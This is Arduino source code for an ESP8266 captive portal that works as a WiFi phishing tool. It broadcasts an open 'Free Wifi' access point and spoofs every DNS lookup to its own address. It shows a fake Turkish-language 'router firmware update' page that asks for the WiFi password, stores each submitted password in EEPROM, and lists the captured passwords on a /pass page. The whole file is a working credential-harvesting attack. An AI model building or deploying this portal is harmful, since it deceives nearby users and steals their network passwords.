// Code for ESP8266 Wifi Captive Portal.

// Adding libraries.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default main strings.
#define SUBTITLE "Yönlendirici bilgisi."
#define TITLE "Güncelleme"
#define BODY "Yönlendirici firmware'iniz güncel değil. Normal taramaya devam etmek için firmware'inizi güncelleyin."
#define POST_TITLE "Updating..."
#define POST_BODY "Yönlendiriciniz güncelleniyor. Lütfen işlem tamamlanana kadar bekleyin.. </br> Teşekkür ederim."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Initial system settings.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Default wifi SSID name.
const char *SSID_NAME = "Free Wifi";

String allPass = "";     // For storing all passwords.
String newSSID = "";     // For adding new SSID.
String currentSSID = ""; // For storing the SSID in the EEPROM.

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; text-align:center; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em;  }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 1px solid #555555; color: #000000; }"
               "label { color: #333; display: block; text-align:center; font-style: italic; font-weight: bold; }"
               "nav { background: #fff; color: #00539b; text-align:center; display: block; font-size: 1.3em; padding: 0.8em; }"
               "nav b { display: block; text-align:center; font-size: 1.5em; margin-bottom: 0.1em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><div style=\"text-align:center;\"><img src='data:image/png;base64,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' alt=\"logo\"></div><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi sifre:</label>" +
         "<input type=password name=m></input><input type=submit style=background-color: blue; value=Güncelleme></form>" + footer();
}

String posted()
{
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
  // The BUILTIN_LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Starting serial communication.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read SSID in the EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the BUILTIN_LED.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
